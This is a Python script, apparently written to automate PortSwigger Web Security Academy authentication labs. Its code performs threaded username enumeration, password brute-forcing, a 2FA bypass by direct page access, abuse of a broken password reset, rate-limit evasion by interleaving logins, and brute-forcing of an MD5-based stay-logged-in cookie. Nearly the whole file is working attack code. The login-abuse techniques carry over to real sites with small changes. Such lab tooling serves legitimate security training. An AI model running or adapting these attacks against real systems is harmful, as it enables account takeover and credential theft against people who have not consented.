import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import sys
import re
import threading
import time
import urllib3 
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

Logo =  r"""
    ____             __                 ___         __  __               __  _            __  _                
   / __ )_________  / /_____  ____     /   | __  __/ /_/ /_  ___  ____  / /_(_)________ _/ /_(_)___  ____      
  / __  / ___/ __ \/ //_/ _ \/ __ \   / /| |/ / / / __/ __ \/ _ \/ __ \/ __/ / ___/ __ `/ __/ / __ \/ __ \     
 / /_/ / /  / /_/ / ,< /  __/ / / /  / ___ / /_/ / /_/ / / /  __/ / / / /_/ / /__/ /_/ / /_/ / /_/ / / / /     
/_____/_/   \____/_/|_|\___/_/ /_/  /_/__|_\__,_/\__/_/ /_/\___/_/ /_/\__/_/\___/\__,_/\__/_/\____/_/ /_/      
                        / ____/_  __________  ___  _____                                           
                       / /_  / / / /_  /_  / / _ \/ ___/                                           
                      / __/ / /_/ / / /_/ /_/  __/ /                                               
                     /_/    \__,_/ /___/___/\___/_/                                                
        Version 1.01                                               By:Youssef Taha                                             
_______________________________________________________________________________________
"""

stop_event   = threading.Event()
stop_P_event = threading.Event()
stop_T_event = threading.Event()
# --------------------------------------Functions-----------------------------------------------------

def print_execution_time(func):
    """Decorator to print function execution time"""
    def wrapper(*args, **kwargs):
        start_time = time.perf_counter()
        result = func(*args, **kwargs)
        end_time = time.perf_counter()
        print(f"[+] Time taken: {end_time - start_time:.2f} seconds")
        return result
    return wrapper

def username_enum(session, url, user,error_message,stop_event):
    
    # Stop immediately if another thread already found a username
    if stop_event.is_set():
        return None

    try:
        r = session.post(
            url + "/login",
            data={'username': user, 'password': 'Testing'},
            timeout=10,
            verify=False)
        
        if stop_event.is_set():
            return None

        soup = BeautifulSoup(r.content, 'html.parser')
        msg = soup.find('p', class_='is-warning').getText()

        if msg !=  error_message :
            stop_event.set()
            return user 
            
        else:
            print(f"[-] Trying {user}", end='\r', flush=True)

    except requests.exceptions.ConnectionError:
        print("[-] Connection failed")
        return None

    except requests.exceptions.Timeout:
        print("[-] Timeout")
        return None

    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def concurrent_username_enum(session,url,usernames,error_message) : 

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(username_enum, session, url, username, error_message,stop_event) for username in usernames]
        valid_user = None
        try:
            for future in as_completed(futures):
                valid_user = future.result()
                if valid_user:
                    print('\r\033[K', end='') # Remove The Line Content Before OverWriting it 
                    print(f"[+] Found valid username: {valid_user}")
                    # Found The User and Moved to Password brute force
                    print(f"[*] Start Brute-forcing The password for '{valid_user}' user ....")
                    executor.shutdown(wait=True)
                    return valid_user
        
        except Exception as e:
            print(f"[-] Error during username enumeration: {str(e)}")


def password_bruteforce(session, url, username, password, stop_P_event):
    
    if stop_P_event.is_set():
        return None
    try:
        r = session.post(
            url + "/login",
            data={'username': username, 'password': password},
            timeout=10,
            verify=False
        )
        if stop_P_event.is_set():
            return None
        
        soup = BeautifulSoup(r.content, 'html.parser')
        msg = soup.find('p', class_='is-warning')

        # Correct password → no warning message
        if (not msg)  :
            stop_P_event.set()
            print('\r\033[K', end='') # Remove The Line Content Before OverWriting it 
            print(f"[+] Found The correct password: {password}")
            print(f"[+] Trying to Login: {username}:{password}")
            print(f"[*] Successfully Solved The Lab. ✅✅")
            return password
        else :
            print(f"[-] Trying {username}:{password}", end='\r', flush=True)

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


def concurrent_password_bruteforce(session,url,valid_user,passwords) : 

    with ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(password_bruteforce,session,url,valid_user,password,stop_P_event)for password in passwords]

                try:
                    for future in as_completed(futures):
                        valid_password = future.result()
                        if valid_password:
                            return valid_password

                except Exception as e:
                    print(f"[-] Error during password brute force: {str(e)}")
                    sys.exit(1)


@print_execution_time
def bypass_2fa(session, url):
    """Attempt to bypass 2FA by directly accessing the account page"""

    login_url = url + "/login"
    login_data = {
        "username": "carlos",
        "password": "montoya"
    }

    print(f"[*] Attempting login as {login_data['username']}...")
    response = session.post(login_url, data=login_data, timeout=10, verify=False)

    if response.status_code != 200:
        print(f"[-] Login failed with status code: {response.status_code}")
        return

    print(f"[+] Logged in as {login_data['username']}")

    my_account_url = url + "/my-account"
    response = session.get(my_account_url)
    if "Log out" in response.text:
        print("[+] Bypassing 2FA and Accessed the account page successfully through direct  access.  ✅✅")
    else:
        print("[-] Failed to access the account page") 


@print_execution_time
def Broken_Reset_flaw (session,url) : 
    
    #Reset the user Password 
    print("(+) Trying To Reset Carlos Password")
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=x"
    password_reset_data = {"temp-forgot-password-token" : "x" , "username": "carlos" ,"new-password-1":"Hacked!" , "new-password-2" : "Hacked!"}
    request  = session.post(password_reset_url,password_reset_data,verify=False)
    print ("(+) The Password Reset successfully.....") 


    # Access The user account with the New Password 
    print(f"(+) Trying to log into Carlos account After modified a new passowrd: (Hacked!)")
    login_url = url + "/login"
    login_data = {"username" :"carlos" , "password" : "Hacked!"} 
    request = session.post(login_url,login_data,verify=False)

    # Confirm 
    if "Log out" in request.text : 
        print(f"(+) logged in to {login_data['username']} account successfully. ✅✅")
    elif "Invalid username or password" in request.text:
        print("(-) Failed -> Invalid username or password")
    else : 
        print("(-) Failed  -> Your Request isn't Correct.")
        sys.exit(-1)

  
@print_execution_time
def ip_block(session,url,passwords) :
    user_pass = dict() 
    
    for i in range (len(passwords) ) :
        if i % 3 :
            user_pass['username'] = "carlos"
            user_pass['password'] = passwords[i]

        else:
            user_pass['username'] = "wiener"
            user_pass['password'] = "peter"

        try:
            r = session.post(
                url + "/login",
                headers={ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'},
                data={'username': user_pass['username'], 'password': user_pass["password"] },
                timeout=10,
                verify=False)
        
            
            soup = BeautifulSoup(r.content, 'html.parser')
            msg_element = soup.find('p', class_='is-warning')

            if msg_element:
                msg = msg_element.getText()
                if msg == 'Incorrect password':
                    print(f"[-] Trying ----> {user_pass['username']}:{user_pass["password"]}.")

                else:
                    print(msg)
            elif user_pass['username'] == "wiener": 
                print(f"[*] Logged in Using  {user_pass['username']}'s Account to reset the Rate Limiting Mechanism.")
            elif user_pass['username'] == 'carlos' : 
                print("============="*8)
                print(f"[+] Found carlos's Passowrd ---------> {user_pass['password']}")
                print(f"[*] Trying To Login Using Carlos Creds {user_pass['username']}:{user_pass['password']}")
                print(f"[+] Successfull Solved The Lab.✅✅")
                break

        except requests.exceptions.ConnectionError:
            print("[-] Connection failed")
            sys.exit(1)

        except requests.exceptions.Timeout:
            print("[-] Timeout")
            sys.exit(1)

        except Exception as e:
            print(f"[-] Error: {e}")
            sys.exit(1)      

def Brute_force_Session(url,passwords) : 
    
    for password in passwords : 
        hashed_password = hashlib.md5(password.encode('utf-8')).hexdigest()
        Session_value = f"carlos:{hashed_password}"
        encoded_session_value = base64.b64encode(bytes(Session_value,'utf-8')).decode('utf-8')

        print(f"\ntrying --------> {password} ")
        print(f"MD5 Hasing: {hashed_password} ")
        print(f"Session: {Session_value} ")
        print(f"Base64 Encoded Session: {encoded_session_value} ")
        
        cookies = {'stay-logged-in': encoded_session_value}
        myaccount_url = url + "/my-account"
        response = requests.get(myaccount_url, cookies=cookies, verify=False)
        print(f"(*) Requesting /my-account page Using The Encoded Session.")
    


        soup = BeautifulSoup(response.content, 'html.parser')
        Button = soup.find(name='button', class_='button')

        if Button :
            msg = Button.get_text()
            if msg == " Update email " :
                print("========="*8)
                print(f"[+] Found carlos's password: {password}")
                print(f"[+] Carlos Session: {encoded_session_value} ")
                break
            else :
                pass
# Main Function
# ----------------------------

def main():
    parser = argparse.ArgumentParser(
        description='Broken Authentication Fuzzer',
        usage='python3 %(prog)s -u <target_url> [-p PROXY]')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://example.com)')
    parser.add_argument('-p', '--proxies', nargs='?', const='127.0.0.1:8080',
                       help='Proxy server (default: 127.0.0.1:8080)')
    args = parser.parse_args()

    # Validate and normalize URL
    url = args.url.rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
        print(f"[*] Assuming HTTP protocol: {url}")

    pattern = re.compile(r'^https?:\/\/(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}')
    if not pattern.match(url):
        print("[-] Invalid URL format")
        print("[-] Example: https://example.com")
        sys.exit(1)

    # Setup proxies
    proxies = None
    if args.proxies:
        try:
            # Validate proxy format
            if ':' not in args.proxies:
                print("[-] Invalid proxy format. Expected IP:PORT")
                sys.exit(1)
            proxy = f"http://{args.proxies}"
            proxies = {'http': proxy, 'https': proxy}
            print(f"[*] Using proxy: {args.proxies}")
        except Exception as e:
            print(f"[-] Error setting up proxy: {e}")
            sys.exit(1)

    # Load wordlists with error handling
    try:
        with open('username.txt', 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        if not usernames:
            print("[-] Username file is empty or not found")
            sys.exit(1)
    except FileNotFoundError:
        print("[-] username.txt file not found")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading username.txt: {e}")
        sys.exit(1)

    try:
        with open('passwords.txt', 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        if not passwords:
            print("[-] Password file is empty or not found")
            sys.exit(1)
    except FileNotFoundError:
        print("[-] passwords.txt file not found")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading passwords.txt: {e}")
        sys.exit(1)

    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)

    error_message2 = 'Invalid username or password.'
    print(Logo)

    # Test initial connectivity
    try:
        request = session.get(url, timeout=10)
        if request.status_code != 200:
            print(f"[-] Failed to access lab page (Status: {request.status_code})")
            sys.exit(1)

        soup = BeautifulSoup(request.content, 'html.parser')
        title_container = soup.find(name='div', class_='title-container')
        if not title_container:
            print("[-] Could not find lab title - this may not be a PortSwigger lab")
            sys.exit(1)

        lab_name = title_container.find("h2").text.strip()

    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection failed: {str(e)}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Connection timeout")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error accessing lab page: {str(e)}")
        sys.exit(1)

    # ------------------------------------------------------------------------------------------Handle different lab types ------------------------------------------------------------------------------------------
    if lab_name == "2FA simple bypass":
        print("[*] Starting 2FA bypass...")
        bypass_2fa(session=session, url=url)

    
    elif lab_name == "Password reset broken logic":
        Broken_Reset_flaw(session, url)


    elif lab_name == "Username enumeration via different responses":
        
        print("[*] Starting username enumeration...")
        error_message = 'Invalid username'
        valid_user = concurrent_username_enum(session=session,url=url,usernames=usernames,error_message=error_message) 

        if not valid_user:
            print("[-] No valid username found")
            sys.exit(1)

        valid_password = concurrent_password_bruteforce(session=session,url=url,valid_user=valid_user,passwords=passwords)

        if not valid_password : 
            print("[-] Password not found.......")
            sys.exit(1)
    
    
    elif lab_name == "Username enumeration via subtly different responses":
            print("[*] Starting username enumeration...")
            error_message = error_message2
            valid_user = concurrent_username_enum(session=session,url=url,usernames=usernames,error_message=error_message) 

            if not valid_user:
                print("[-] No valid username found")
                sys.exit(1)        

            valid_password = concurrent_password_bruteforce(session=session,url=url,valid_user=valid_user,passwords=passwords)

            if not valid_password : 
                print("[-] Password not found.......")
                sys.exit(1)

    elif lab_name == "Broken brute-force protection, IP block":
        print("[*] Starting Brute-Force carlos's Password.")
        ip_block(session,url,passwords)

    elif lab_name == "Brute-forcing a stay-logged-in cookie" :
        print("[*] Trying To Brute-force the encoded Cookie...")
        Brute_force_Session(url,passwords)


    else:
        print(f"[-] '{lab_name}' Lab is not supported yet")
        print("[*]  Supported labs:")
        print("       - Username enumeration via different responses")
        print("       - 2FA simple bypass")
        print("       - Password reset broken logic")
        print("       - Username enumeration via subtly different responses")
        print("       - Broken brute-force protection, IP block")
        print("       - Brute-forcing a stay-logged-in cookie")




if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
